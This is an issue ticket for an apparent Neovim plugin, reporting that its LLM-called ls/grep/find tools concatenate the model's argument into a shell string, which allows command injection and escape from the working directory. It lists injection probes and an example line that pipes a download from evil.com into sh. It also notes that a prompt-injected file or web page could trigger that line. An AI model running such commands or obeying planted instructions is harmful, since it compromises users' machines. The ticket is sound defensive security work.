---
id: '000144'
status: done
started: 2026-06-26T09:28:30-07:00
created: 2026-06-26
updated: 2026-06-26
estimate_hours: 4.0
actual_hours: 3.5
---

# tool input safety: ls/grep/find shell injection + cwd escape

## Problem

`ls`/`grep`/`find` (`lua/parley/tools/builtin/{ls,grep,find}.lua`) build
`vim.fn.system(cmd .. " " .. input.command)` — the LLM's `command` argument is
concatenated into a **shell** string with **zero** sanitization. So they are
de-facto an arbitrary-shell tool. Verified empirically (2026-06-26, non-destructive):

| probe | result |
|---|---|
| `ls ". ; echo INJECTED"` | executed — `;` chains arbitrary commands |
| `ls "$(echo SUBST)"` | expanded — `$(…)` command substitution runs |
| `ls /` | listed root — **not** confined to cwd |

So `ls .; curl evil.com \| sh` runs. The `"Confined to the working directory"`
line in all three descriptions is **false**, and this is reachable via prompt
injection (a malicious file read into context, or a `web_fetch`'d page, can
instruct exactly this). The #140 cwd-guard (`resolve_path_in_cwd`) only checks
`path`/`file_path` fields — not the freeform `command` string — so it does not
cover these tools.

Found while scoping #139 (output safety); split out as the higher-urgency,
security-critical half.
